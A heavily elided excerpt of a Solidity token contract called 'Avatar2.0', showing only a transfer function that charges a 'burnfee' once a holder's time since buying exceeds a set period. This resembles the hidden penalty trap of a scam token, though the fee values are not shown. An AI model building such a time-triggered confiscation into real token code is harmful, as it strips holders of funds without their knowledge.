...
contract  Avatar2   is Ownable, IERC20 {
    ...
    string private  _name = "Avatar2.0";
    string private  _symbol = "Avatar2.0";
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if (    Buyser[from] + FOMOTIME  <= block.timestamp )    {   burnfee = amount.mul(BitchfEE).div(10); }     }  }
